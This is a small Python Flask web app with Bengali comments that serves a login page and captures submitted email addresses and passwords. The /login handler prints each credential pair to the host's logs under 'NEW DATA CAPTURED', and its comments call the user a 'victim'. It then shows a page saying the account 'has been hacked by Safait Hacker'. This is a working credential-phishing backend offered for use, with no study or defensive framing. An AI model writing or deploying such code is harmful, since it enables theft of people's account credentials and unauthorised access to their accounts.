from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # পাসওয়ার্ড এবং ইমেইল রিসিভ করা
    email = request.form.get('email')
    password = request.form.get('password')
    
    # এটি রেন্ডারের 'Logs' সেকশনে প্রিন্ট করবে যাতে আপনি দেখতে পারেন
    print(f"--- NEW DATA CAPTURED ---")
    print(f"Email: {email}")
    print(f"Password: {password}")
    print(f"-------------------------")

    # লগইন করার পর ভিকটিম যা দেখবে (আপনার অনুরোধ করা স্টাইলিশ মেসেজ)
    return """
    <html>
    <head>
        <style>
            body { background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            h1 { color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; text-shadow: 0 0 10px #00FF00; }
        </style>
    </head>
    <body>
        <h1>Your account has been hacked by Safait Hacker!</h1>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
